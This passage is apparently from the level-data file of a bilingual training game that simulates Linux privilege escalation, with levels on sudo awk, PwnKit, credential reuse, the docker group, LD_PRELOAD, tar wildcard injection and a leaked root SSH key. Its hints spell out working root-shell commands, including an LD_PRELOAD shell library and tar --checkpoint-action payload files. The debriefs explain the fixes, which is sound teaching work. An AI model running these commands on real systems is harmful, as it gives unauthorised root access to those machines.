        flag: 'flag{sud0_awk_sh3ll}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{sud0_awk_sh3ll}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'awk'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/sudo': SUID_BIN(),
            '/usr/bin/awk': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            player: [
                { cmd: '/usr/bin/awk', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        debrief: {
            en: {
                vuln: 'Sudoers misconfiguration — NOPASSWD on awk',
                why: "'player' could run awk as root. awk's BEGIN{system(...)} executes arbitrary shell commands, inheriting sudo's root privileges — an instant root shell, exactly like vim, less, find, env and dozens more on GTFOBins.",
                fix: 'Never grant sudo on general-purpose interpreters or text tools. Restrict sudo rules to specific, non-shelling binaries with fixed arguments, and cross-check every allowed command against GTFOBins.',
                link: 'https://gtfobins.github.io/gtfobins/awk/'
            },
            fr: {
                vuln: 'Mauvaise config sudoers — NOPASSWD sur awk',
                why: "'player' pouvait lancer awk en root. Le bloc BEGIN{system(...)} d'awk exécute des commandes shell arbitraires en héritant des droits root de sudo — un shell root immédiat, comme vim, less, find, env et des dizaines d'autres sur GTFOBins.",
                fix: 'Ne jamais donner sudo sur un interpréteur ou un outil texte généraliste. Restreins les règles sudo à des binaires précis, non-shellants, avec arguments figés, et vérifie chaque commande autorisée sur GTFOBins.',
                link: 'https://gtfobins.github.io/gtfobins/awk/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 8 — Simulated kernel exploit (PwnKit / CVE-2021-4034)
    // ─────────────────────────────────────────────────────────────
    {
        id: 8,
        codename: 'box-08',
        title: { en: 'Box-08 · Kernel Panic Room', fr: 'Box-08 · La salle du kernel' },
        brief: {
            en: 'No SUID, no sudo, no caps. But the system is old and a public PoC is sitting in your home. Some vulns are in the software itself.',
            fr: 'Pas de SUID, pas de sudo, pas de caps. Mais le système est vieux et un PoC public traîne dans ton home. Certaines failles sont dans le logiciel lui-même.'
        },
        user: 'player',
        host: 'box-08',
        cwd: '/home/player',
        objectives: {
            en: ['Note the outdated system / pkexec version', 'Locate the exploit PoC', 'Run it to get root'],
            fr: ['Repérer le système / pkexec obsolète', 'Localiser le PoC de l\'exploit', 'L\'exécuter pour obtenir root']
        },
        hints: {
            en: [
                'Read HINT.txt and note the polkit/pkexec version — CVE-2021-4034 (PwnKit) affects it.',
                'There is a compiled PoC in your home directory: ls -la',
                'Run it: ./pwnkit'
            ],
            fr: [
                'Lis HINT.txt et note la version de polkit/pkexec — CVE-2021-4034 (PwnKit) la touche.',
                'Un PoC compilé traîne dans ton home : ls -la',
                'Lance-le : ./pwnkit'
            ]
        },
        flag: 'flag{pwnk1t_cve_2021_4034}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'HINT.txt', 'pwnkit'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/home/player/HINT.txt': { type: 'file', owner: 'player', mode: '644', content: 'SUID/sudo/caps audit: clean.\nBut check the software versions:\n  $ pkexec --version  ->  pkexec version 0.105\nThat build predates the CVE-2021-4034 (PwnKit) fix.\nA precompiled PoC (./pwnkit) is in this directory.\n' },
            '/home/player/pwnkit': { type: 'file', owner: 'player', mode: '755', exploit: 'kernel_exploit', content: 'ELF 64-bit LSB executable, x86-64 — CVE-2021-4034 (pwnkit) local root PoC' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'os-release'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/os-release': { type: 'file', owner: 'root', mode: '644', content: 'PRETTY_NAME="Ubuntu 18.04.1 LTS"\nVERSION_ID="18.04"\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{pwnk1t_cve_2021_4034}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'pkexec'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/pkexec': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary (polkit 0.105)' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'kernel_exploit' }
        ],
        harden: {
            type: 'unset_suid', target: '/usr/bin/pkexec',
            obj: { en: 'Drop the SUID bit from the vulnerable pkexec', fr: 'Retire le bit SUID du pkexec vulnérable' },
            hint: { en: 'chmod u-s /usr/bin/pkexec', fr: 'chmod u-s /usr/bin/pkexec' }
        },
        debrief: {
            en: {
                vuln: 'Unpatched local privilege escalation (CVE-2021-4034, PwnKit)',
                why: 'pkexec from polkit 0.105 mishandles argument count, letting a local user execute code as root. When SUID/sudo/caps are all clean, an out-of-date, vulnerable component is the way in — patch level is part of the attack surface.',
                fix: 'Patch and keep systems up to date (apt upgrade). Track advisories for SUID components like pkexec/polkit. As a stopgap, remove the SUID bit from pkexec until patched, and monitor for known-exploit binaries dropped in home/tmp.',
                link: 'https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt'
            },
            fr: {
                vuln: 'Élévation de privilèges non corrigée (CVE-2021-4034, PwnKit)',
                why: 'pkexec de polkit 0.105 gère mal le nombre d\'arguments, permettant à un utilisateur local d\'exécuter du code en root. Quand SUID/sudo/caps sont propres, c\'est un composant obsolète et vulnérable qui devient la porte d\'entrée — le niveau de patch fait partie de la surface d\'attaque.',
                fix: 'Patche et tiens les systèmes à jour (apt upgrade). Suis les avis de sécurité des composants SUID comme pkexec/polkit. En dépannage, retire le bit SUID de pkexec en attendant, et surveille les binaires d\'exploit connus déposés dans home/tmp.',
                link: 'https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 9 — Credential reuse → lateral move → sudo (multi-step)
    // ─────────────────────────────────────────────────────────────
    {
        id: 9,
        codename: 'box-09',
        title: { en: 'Box-09 · Leftover Credentials', fr: 'Box-09 · Les identifiants oubliés' },
        brief: {
            en: 'A plaintext password is rotting in a config file. It belongs to a service account — and that account was given too much sudo. Chain it.',
            fr: 'Un mot de passe en clair pourrit dans un fichier de conf. Il appartient à un compte de service — à qui on a donné trop de sudo. Enchaîne.'
        },
        user: 'player',
        host: 'box-09',
        cwd: '/home/player',
        objectives: {
            en: ['Enumerate readable files under /opt', 'Recover the service credentials', 'su to that account and abuse its sudo rights'],
            fr: ['Énumérer les fichiers lisibles sous /opt', 'Récupérer les identifiants du service', 'su vers ce compte et abuser de ses droits sudo']
        },
        hints: {
            en: [
                'Look in the web app config: cat /opt/app/config.php — note the DB user and password.',
                'That password is reused for the "svc" login. Switch to it: su svc',
                'As svc, check sudo -l — you can run bash as root: sudo bash'
            ],
            fr: [
                'Regarde la conf de l\'app web : cat /opt/app/config.php — note l\'utilisateur et le mot de passe DB.',
                'Ce mot de passe est réutilisé pour le compte "svc". Bascule dessus : su svc',
                'En svc, regarde sudo -l — tu peux lancer bash en root : sudo bash'
            ]
        },
        flag: 'flag{cr3d_reuse_l4teral}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'opt', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player', 'svc'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/home/svc': { type: 'dir', owner: 'svc', mode: '755', children: ['.bashrc'] },
            '/home/svc/.bashrc': { type: 'file', owner: 'svc', mode: '644', content: '# svc account\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\nsvc:x:1001:1001:service account:/home/svc:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{cr3d_reuse_l4teral}\n' },
            '/opt': { type: 'dir', owner: 'root', mode: '755', children: ['app'] },
            '/opt/app': { type: 'dir', owner: 'root', mode: '755', children: ['config.php'] },
            '/opt/app/config.php': { type: 'file', owner: 'root', mode: '644', content:
`<?php
// DB connection — TODO: move secrets out of source control
$db_host = "127.0.0.1";
$db_user = "svc";
$db_pass = "S3rv!ce_2024";   // NOTE: svc reuses this for the system login too
?>
` },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'su'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/sudo': SUID_BIN(),
            '/usr/bin/su': { type: 'file', owner: 'root', mode: '4755', suid: true, content: 'ELF binary' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            svc: [
                { cmd: '/usr/bin/bash', nopasswd: true, runas: 'root' }
            ]
        },
        wins: [
            { type: 'sudo_shell' }
        ],
        debrief: {
            en: {
                vuln: 'Credential reuse + over-privileged service account',
                why: 'A plaintext password sat in a world-readable config file. The svc account reused it for its system login, and svc was allowed to run bash via sudo. Chaining enumeration → lateral move → sudo abuse turns one leaked secret into full root.',
                fix: 'Keep secrets out of source and world-readable files (use a vault / env with tight perms). Enforce unique credentials per service, and scope sudo to the minimum — never grant sudo on a shell.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
            },
            fr: {
                vuln: 'Réutilisation d\'identifiants + compte de service sur-privilégié',
                why: 'Un mot de passe en clair traînait dans un fichier de conf lisible par tous. Le compte svc le réutilisait pour son login système, et svc pouvait lancer bash via sudo. Enchaîner énumération → mouvement latéral → abus de sudo transforme un secret fuité en root complet.',
                fix: 'Garde les secrets hors du code et des fichiers lisibles par tous (coffre-fort / env aux droits stricts). Impose des identifiants uniques par service, et restreins sudo au minimum — jamais sudo sur un shell.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 10 — Docker group membership
    // ─────────────────────────────────────────────────────────────
    {
        id: 10,
        codename: 'box-10',
        title: { en: 'Box-10 · Whale of a Privilege', fr: 'Box-10 · Une baleine de privilèges' },
        brief: {
            en: 'You are in the "docker" group. That is effectively root — you can mount the host filesystem inside a container you control.',
            fr: 'Tu es dans le groupe "docker". C\'est root en pratique — tu peux monter le système hôte dans un conteneur que tu contrôles.'
        },
        user: 'player',
        host: 'box-10',
        cwd: '/home/player',
        objectives: {
            en: ['Confirm your group membership', 'Run a container that mounts the host root', 'chroot into it as root'],
            fr: ['Confirmer ton appartenance au groupe', 'Lancer un conteneur qui monte la racine hôte', 'chroot dedans en root']
        },
        hints: {
            en: [
                'Check your groups: id — being in "docker" is a known privesc.',
                'A container can bind-mount the whole host: -v /:/mnt',
                'Payload: docker run -v /:/mnt -it alpine chroot /mnt sh'
            ],
            fr: [
                'Vérifie tes groupes : id — être dans "docker" est un privesc connu.',
                'Un conteneur peut monter tout l\'hôte : -v /:/mnt',
                'Payload : docker run -v /:/mnt -it alpine chroot /mnt sh'
            ]
        },
        flag: 'flag{d0cker_group_pwn}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'group'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/group': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:\ndocker:x:999:player\nplayer:x:1000:\n' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{d0cker_group_pwn}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'docker', 'id'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/docker': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary (docker client)' },
            '/usr/bin/id': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: ['run'] },
            '/var/run': { type: 'dir', owner: 'root', mode: '755', children: ['docker.sock'] },
            '/var/run/docker.sock': { type: 'file', owner: 'root', mode: '660', content: 'unix socket' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'docker_sock' }
        ],
        debrief: {
            en: {
                vuln: 'Membership of the docker group',
                why: 'The docker group grants full control of the Docker daemon, which runs as root. Mounting the host filesystem into a container (-v /:/mnt) and chrooting into it gives an unrestricted root shell on the host. docker group ≈ root.',
                fix: 'Treat docker group membership as equivalent to root and grant it only to trusted admins. Prefer rootless Docker or fine-grained tooling, and audit who is in docker/lxd/kvm groups.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/docker-security'
            },
            fr: {
                vuln: 'Appartenance au groupe docker',
                why: 'Le groupe docker donne le contrôle total du démon Docker, qui tourne en root. Monter le système hôte dans un conteneur (-v /:/mnt) puis chrooter dedans donne un shell root sans restriction sur l\'hôte. groupe docker ≈ root.',
                fix: 'Considère l\'appartenance au groupe docker comme équivalente à root et ne l\'accorde qu\'à des admins de confiance. Préfère Docker rootless ou un outillage granulaire, et audite qui est dans les groupes docker/lxd/kvm.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/docker-security'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 11 — LD_PRELOAD via sudo env_keep
    // ─────────────────────────────────────────────────────────────
    {
        id: 11,
        codename: 'box-11',
        title: { en: 'Box-11 · Preload Pandemonium', fr: 'Box-11 · Chaos au préchargement' },
        brief: {
            en: 'sudo lets you run one harmless-looking binary as root — but it also kept LD_PRELOAD in the environment. Load your own library.',
            fr: 'sudo t\'autorise un binaire d\'apparence inoffensive en root — mais il a aussi gardé LD_PRELOAD dans l\'environnement. Charge ta propre bibliothèque.'
        },
        user: 'player',
        host: 'box-11',
        cwd: '/home/player',
        objectives: {
            en: ['Read your sudo rights and spot env_keep', 'Build a shared object that spawns a shell', 'Preload it through sudo'],
            fr: ['Lire tes droits sudo et repérer env_keep', 'Construire un objet partagé qui ouvre un shell', 'Le précharger via sudo']
        },
        hints: {
            en: [
                'Run sudo -l — note "env_keep+=LD_PRELOAD" and the NOPASSWD command you may run.',
                'Write a tiny library whose _init() runs setuid(0); system("/bin/sh"), then compile it:\n  echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/x.c\n  gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c',
                'Preload it through the sudo-allowed command:\n  sudo LD_PRELOAD=/tmp/x.so apache2ctl'
            ],
            fr: [
                'Lance sudo -l — repère "env_keep+=LD_PRELOAD" et la commande NOPASSWD autorisée.',
                'Écris une petite bibliothèque dont _init() fait setuid(0); system("/bin/sh"), puis compile-la :\n  echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/x.c\n  gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c',
                'Précharge-la via la commande autorisée par sudo :\n  sudo LD_PRELOAD=/tmp/x.so apache2ctl'
            ]
        },
        flag: 'flag{ld_pr3load_env_keep}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'notes.txt'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/home/player/notes.txt': { type: 'file', owner: 'player', mode: '644', content: 'Ops left me sudo on apache2ctl "for restarts".\nThe sudoers Defaults line looks unusually permissive.\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'sudoers'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/sudoers': { type: 'file', owner: 'root', mode: '440', content: 'ACCESS DENIED' },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{ld_pr3load_env_keep}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin', 'sbin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'sudo', 'gcc'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/sudo': SUID_BIN(),
            '/usr/bin/gcc': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/sbin': { type: 'dir', owner: 'root', mode: '755', children: ['apache2ctl'] },
            '/usr/sbin/apache2ctl': { type: 'file', owner: 'root', mode: '755', content: '#!/bin/sh\n# apache control wrapper\n' },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        sudoers: {
            player: [
                { cmd: '/usr/sbin/apache2ctl', nopasswd: true, runas: 'root' }
            ]
        },
        env_keep: ['LD_PRELOAD'],
        wins: [
            { type: 'ld_preload' }
        ],
        debrief: {
            en: {
                vuln: 'sudo env_keep leaves LD_PRELOAD intact',
                why: 'The sudoers Defaults kept LD_PRELOAD in the environment. Even a restricted NOPASSWD command becomes root code execution: a shared object whose _init() runs setuid(0)/system is loaded before the target binary and executes with root privileges.',
                fix: 'Never add LD_PRELOAD / LD_LIBRARY_PATH to env_keep. Rely on the default env_reset, keep sudo command allow-lists tight, and prefer full paths with fixed arguments so dangerous environment variables can never be smuggled in.',
                link: 'https://gtfobins.github.io/gtfobins/'
            },
            fr: {
                vuln: 'sudo env_keep conserve LD_PRELOAD',
                why: 'La directive Defaults de sudoers gardait LD_PRELOAD dans l\'environnement. Même une commande NOPASSWD restreinte devient de l\'exécution de code root : un objet partagé dont _init() fait setuid(0)/system est chargé avant le binaire cible et s\'exécute avec les droits root.',
                fix: 'Ne jamais ajouter LD_PRELOAD / LD_LIBRARY_PATH à env_keep. S\'appuyer sur env_reset par défaut, garder des listes de commandes sudo strictes, et préférer des chemins complets avec arguments figés pour qu\'aucune variable d\'environnement dangereuse ne puisse être injectée.',
                link: 'https://gtfobins.github.io/gtfobins/'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 12 — Wildcard injection (tar --checkpoint in a root cron)
    // ─────────────────────────────────────────────────────────────
    {
        id: 12,
        codename: 'box-12',
        title: { en: 'Box-12 · Wildcard Gone Wild', fr: 'Box-12 · Le joker sauvage' },
        brief: {
            en: 'A root cron archives a directory you can write to, using tar with a "*". Filenames can become tar options. Weaponise the wildcard.',
            fr: 'Un cron root archive un dossier où tu peux écrire, avec tar et un "*". Les noms de fichiers peuvent devenir des options tar. Arme le joker.'
        },
        user: 'player',
        host: 'box-12',
        cwd: '/home/player',
        objectives: {
            en: ['Read the root cron and its tar command', 'Drop a script plus crafted --checkpoint files', 'Wait for cron to run tar as root'],
            fr: ['Lire le cron root et sa commande tar', 'Déposer un script et des fichiers --checkpoint piégés', 'Attendre que cron lance tar en root']
        },
        hints: {
            en: [
                'cat /etc/crontab — root runs: cd /home/player/share && tar -czf /var/backups/share.tar.gz *',
                'The "*" expands to filenames, and tar treats --checkpoint-action=exec=... as an option. Create a payload script first:\n  cd /home/player/share\n  echo \'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\' > runme.sh',
                'Now craft the option-filenames (the ./ prefix stops touch treating them as flags) so tar runs your script:\n  touch ./--checkpoint=1\n  touch \'./--checkpoint-action=exec=sh runme.sh\'\n  wait'
            ],
            fr: [
                'cat /etc/crontab — root lance : cd /home/player/share && tar -czf /var/backups/share.tar.gz *',
                'Le "*" est remplacé par les noms de fichiers, et tar interprète --checkpoint-action=exec=... comme une option. Crée d\'abord un script payload :\n  cd /home/player/share\n  echo \'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash\' > runme.sh',
                'Puis fabrique les fichiers-options (le préfixe ./ empêche touch de les prendre pour des options) pour que tar exécute ton script :\n  touch ./--checkpoint=1\n  touch \'./--checkpoint-action=exec=sh runme.sh\'\n  wait'
            ]
        },
        flag: 'flag{w1ldcard_tar_ch3ckpoint}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
            '/home/player': { type: 'dir', owner: 'player', mode: '755', children: ['.bashrc', 'share'] },
            '/home/player/.bashrc': { type: 'file', owner: 'player', mode: '644', content: '# ~/.bashrc\n' },
            '/home/player/share': { type: 'dir', owner: 'player', mode: '755', children: ['report.txt', 'data.csv'] },
            '/home/player/share/report.txt': { type: 'file', owner: 'player', mode: '644', content: 'weekly report\n' },
            '/home/player/share/data.csv': { type: 'file', owner: 'player', mode: '644', content: 'a,b,c\n1,2,3\n' },
            '/etc': { type: 'dir', owner: 'root', mode: '755', children: ['passwd', 'crontab'] },
            '/etc/passwd': { type: 'file', owner: 'root', mode: '644', content: 'root:x:0:0:root:/root:/bin/bash\nplayer:x:1000:1000:player:/home/player:/bin/bash\n' },
            '/etc/crontab': { type: 'file', owner: 'root', mode: '644', content:
`# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/sbin:/usr/bin:/sbin:/bin

# m h dom mon dow user  command
*  *  *   *   *  root  cd /home/player/share && tar -czf /var/backups/share.tar.gz *
` },
            '/root': { type: 'dir', owner: 'root', mode: '700', children: ['flag.txt'] },
            '/root/flag.txt': { type: 'file', owner: 'root', mode: '600', content: 'flag{w1ldcard_tar_ch3ckpoint}\n' },
            '/usr': { type: 'dir', owner: 'root', mode: '755', children: ['bin'] },
            '/usr/bin': { type: 'dir', owner: 'root', mode: '755', children: ['ls', 'cat', 'sh', 'bash', 'tar', 'touch'] },
            '/usr/bin/ls': ELF_BIN(),
            '/usr/bin/cat': ELF_BIN(),
            '/usr/bin/sh': ELF_BIN(),
            '/usr/bin/bash': ELF_BIN(),
            '/usr/bin/tar': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/usr/bin/touch': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' },
            '/var': { type: 'dir', owner: 'root', mode: '755', children: ['backups'] },
            '/var/backups': { type: 'dir', owner: 'root', mode: '755', children: [] },
            '/tmp': { type: 'dir', owner: 'root', mode: '1777', children: [] },
            '/bin': { type: 'dir', owner: 'root', mode: '755', children: ['sh'] },
            '/bin/sh': { type: 'file', owner: 'root', mode: '755', content: 'ELF binary' }
        },
        wins: [
            { type: 'wildcard_tar', dir: '/home/player/share' }
        ],
        debrief: {
            en: {
                vuln: 'Wildcard injection into a root tar cron',
                why: 'root ran tar ... * in a directory you control. The shell expands "*" to the filenames, and tar reads --checkpoint / --checkpoint-action=exec=... as command-line options. Files named after those options make tar execute your script as root.',
                fix: 'Never use unquoted wildcards in privileged scripts. Pass an explicit file list or use "--" and ./ prefixes (tar ... -- *), avoid running archivers over user-writable directories as root, and prefer safe APIs over shell globbing.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks'
            },
            fr: {
                vuln: 'Injection de wildcard dans un cron tar root',
                why: 'root lançait tar ... * dans un dossier que tu contrôles. Le shell remplace "*" par les noms de fichiers, et tar lit --checkpoint / --checkpoint-action=exec=... comme des options. Des fichiers nommés comme ces options font exécuter ton script par tar, en root.',
                fix: 'Ne jamais utiliser de wildcard non quoté dans un script privilégié. Passe une liste de fichiers explicite ou utilise "--" et le préfixe ./ (tar ... -- *), évite d\'archiver en root des dossiers modifiables par l\'utilisateur, et préfère des API sûres au globbing shell.',
                link: 'https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks'
            }
        }
    },

    // ─────────────────────────────────────────────────────────────
    // LEVEL 13 — World-readable root SSH private key
    // ─────────────────────────────────────────────────────────────
    {
        id: 13,
        codename: 'box-13',
        title: { en: 'Box-13 · Keys to the Kingdom', fr: 'Box-13 · Les clés du royaume' },
        brief: {
            en: 'A backup left root\'s SSH private key world-readable. If root accepts that key, you can just log in as root.',
            fr: 'Une sauvegarde a laissé la clé privée SSH de root lisible par tous. Si root accepte cette clé, tu peux simplement te connecter en root.'
        },
        user: 'player',
        host: 'box-13',
        cwd: '/home/player',
        objectives: {
            en: ['Find readable files under /opt/backup', 'Recover root\'s private SSH key', 'Log in as root with it'],
            fr: ['Trouver les fichiers lisibles sous /opt/backup', 'Récupérer la clé privée SSH de root', 'Se connecter en root avec']
        },
        hints: {
            en: [
                'Look for stray key material: ls -la /opt/backup — id_rsa is world-readable.',
                'cat /opt/backup/id_rsa — that is root\'s private key, and /root/.ssh/authorized_keys trusts it.',
                'Use it to log in as root:\n  ssh -i /opt/backup/id_rsa root@localhost'
            ],
            fr: [
                'Cherche des clés qui traînent : ls -la /opt/backup — id_rsa est lisible par tous.',
                'cat /opt/backup/id_rsa — c\'est la clé privée de root, et /root/.ssh/authorized_keys lui fait confiance.',
                'Utilise-la pour te connecter en root :\n  ssh -i /opt/backup/id_rsa root@localhost'
            ]
        },
        flag: 'flag{r00t_ssh_key_l00t}',
        fs: {
            '/': { type: 'dir', owner: 'root', mode: '755', children: ['home', 'etc', 'usr', 'tmp', 'var', 'root', 'opt', 'bin'] },
            '/home': { type: 'dir', owner: 'root', mode: '755', children: ['player'] },
